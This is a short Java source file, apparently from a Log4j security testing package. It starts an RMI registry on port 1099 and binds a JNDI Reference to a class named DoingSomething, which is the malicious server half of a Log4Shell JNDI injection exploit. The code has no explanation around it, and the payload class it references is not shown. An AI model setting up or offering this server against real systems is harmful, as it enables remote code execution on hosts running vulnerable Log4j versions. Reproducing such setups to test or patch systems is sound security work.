package com.ksyun.safe.log4j;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.*;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, NamingException {
        LocateRegistry.createRegistry(1099);
        Registry r = LocateRegistry.getRegistry();
        System.out.println("ref: " + DoingSomething.class.getCanonicalName());
        Reference ref = new Reference(DoingSomething.class.getCanonicalName(),
                DoingSomething.class.getCanonicalName(),
                null);
        ReferenceWrapper rw = new ReferenceWrapper(ref);
        System.out.println("远程调用端口监听1099 启动...");
        r.bind("shit", rw);
    }
}
